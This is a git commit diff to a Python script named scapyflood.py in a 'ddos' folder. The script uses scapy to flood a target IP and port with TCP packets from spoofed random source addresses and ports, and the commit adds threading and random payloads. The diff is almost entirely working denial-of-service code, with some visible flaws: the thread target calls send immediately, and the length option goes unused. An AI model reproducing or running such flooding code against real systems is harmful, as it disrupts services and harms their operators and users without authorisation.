d569b51d5acb26d270adc061f2c01e5c1d653527
bharshbarger <bharshbarger@users.noreply.github.com>
2017-03-06 00:20:17 -0600

    Update scapyflood.py

--- ddos/scapyflood.py
+++ ddos/scapyflood.py
@@ -31,7 +31,7 @@ class Flood:
 	def cls(self):
 	    os.system('cls' if os.name == 'nt' else 'clear')
 
-	def attack(self, args, dstUrl, dstIp, dstPort, multiplier):
+	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads):
 		#attack loop
 		while 1:
 
@@ -49,7 +49,7 @@ class Flood:
 			elapsedTime = str(round((time.time()-startTime)*1000.0))
 
 			#tell the user
-			print 'Target web server '+ str(dstIp)+' responded with HTTP' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
+			print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
 
 
 
@@ -61,17 +61,28 @@ class Flood:
 			srcPort = ''.join('%s'%random.randint(1,65535))
 
 			#tell user what's happening
-			print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
+			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
 
 
-			payload = 'foo'
+			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(multiplier)))
 
-			#print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
-			#TCP packet scapy send
-			send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose)
-			
+			#threaded jobs list
+			jobs = []
 
+			for i in range(0,threads):
 
+				thread = threading.Thread(target=send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose))
+				if args.verbose is True: print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
+				jobs.append(thread)
+				
+			for j in jobs:
+				j.start()
+
+			for j in jobs:
+				j.join()
+
+				
+			#logic to check threshold
 			if float(elapsedTime) <= float(''.join(args.threshold)):
 				print 'under DoS threshold'
 			else:
@@ -79,34 +90,60 @@ class Flood:
 				print 'over DoS threshold'
 				print 'elapsed time is: %s' % elapsedTime
 				print ''.join(args.threshold)
+				#delay algorithm takes absolute difference of threshold and observed latency
 				delay = abs(float(elapsedTime.split('.')[0]) - float(''.join(args.threshold)))
 				print 'DoS threshold of %s met, reducing by %s' % (''.join(args.threshold), str(delay))
+				#sleep the loop for the delay value divided by 1000 to get milliseconds
 				time.sleep(delay/1000)
 
+
+			self.cls()
 
 def main():
 
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-i', '--ipdst', metavar = '127.0.0.1', nargs = 1, help='IP address to attack')
 	parser.add_argument('-p', '--port', metavar = '8000', nargs = 1, help='The port to attack')
-	#parser.add_argument('-P', '--prot', nargs = 1, help='The protocol to use; i.e. ICMP, TCP, UDP')
+	#parser.add_argument('-P', '--prot', nargs = 1, metavar ='tcp', help='The protocol to use; i.e.TCP, UDP. default is tcp')
 	parser.add_argument('-u', '--url', nargs = 1, metavar = 'http://127.0.0.1:8000', help = 'The URL you want to test.')
-	parser.add_argument('-t', '--threshold', nargs = 1, metavar = '250', help = 'The DoS acceptability threshold')
+	parser.add_argument('-t', '--threshold', nargs = 1, metavar = '250', help = 'The DoS acceptability threshold in ms')
+	parser.add_argument('-T', '--threads', nargs = 1, metavar = '2', help ='Number of threads to run, default is 10' )
 	parser.add_argument('-v', '--verbose', help='enable verbosity', action = 'store_true')
-	parser.add_argument('-m', '--multiplier', nargs=1, metavar = '1000', help='Packet multiplier (how many packets to send per timing loop)')
+	parser.add_argument('-m', '--multiplier', nargs=1, metavar = '1000', help='how many packets to send per loop, default is 10')
+	parser.add_argument('-l', '--length', nargs = 1, metavar='1000', help='count of random characters to send in payload. default is 10' )
+	#parser.add_argument('-s', '--scantype', nargs =1, help='scan type. not implemented')
 	args = parser.parse_args()
 
+	#print args if -v
 	if args.verbose is True:print args
 
-	if args.ipdst is None: 
+	#check for non blank to require enteries
+	if (args.ipdst is None or \
+		args.port is None or \
+		#args.prot is None and \
+		args.url is None or \
+		args.length is None or \
+		args.threshold is None):
 		parser.print_help()
 		sys.exit()
+
+	if args.threads is None:
+		threads = 10
+	else:
+		threads = int(''.join(args.threads))
 
 	if args.multiplier is None:
 		multiplier=10
 	else:
 		multiplier=''.join(args.multiplier)
 
+	if args.length is None:
+		length = 10
+	else:
+		length = int(''.join(args.length))
+
+
+	#if ipdst was entered, check if a valid IP
 	if args.ipdst is not None:
 		for a in args.ipdst:
 			try:
@@ -123,9 +160,9 @@ def main():
 
 
 	sendattack = Flood()
-	#sendattack.cls()
+	sendattack.cls()
 	#sendattack.timer(dstUrl, dstIp)
-	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier)
+	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads)
 
 
 
